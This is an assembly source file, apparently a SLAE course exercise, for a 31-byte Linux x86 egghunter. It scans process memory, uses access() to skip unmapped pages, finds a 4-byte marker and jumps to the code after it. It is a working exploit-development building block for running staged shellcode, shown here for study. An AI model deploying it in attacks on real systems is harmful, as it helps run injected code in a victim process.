; Filename    : egghunter.asm
; Author      : Joris Hartog
; Date        : 23-11-2015
; Student     : SLAE-704
; Size        : 31
; Description : This program executes the access function to check
;  if the memory can be accessed, then checks if it is the egg. If 
;  both are true, it will execute the egg. 
;
;  The egg is 4 bytes; 
;   0x50585058 (push eax, pop eax, push eax, pop eax)

global _start

section .text

_start:

	xor edx, edx		; clear edx

nextPage:

	or dx, 0xfff		; this is used to skip through
				; pages instead of bytes

next:

	inc edx			; edx points to the memory
	lea ebx, [edx]		; ebx contains pointer to edx 
	push byte 33
	pop eax			; eax contains syscall no. 33
	int 0x80		; execute access()

	cmp al, 0xf2		; check if EFAULT is returned
	jz nextPage		;  and repeat if false

	mov eax, 0x5850584f
	inc eax			; eax contains egg
	cmp dword [edx], eax	; check if memory is egg
	jnz next		;  and repeat if false
	jmp edx			; The egg is found; execute it!

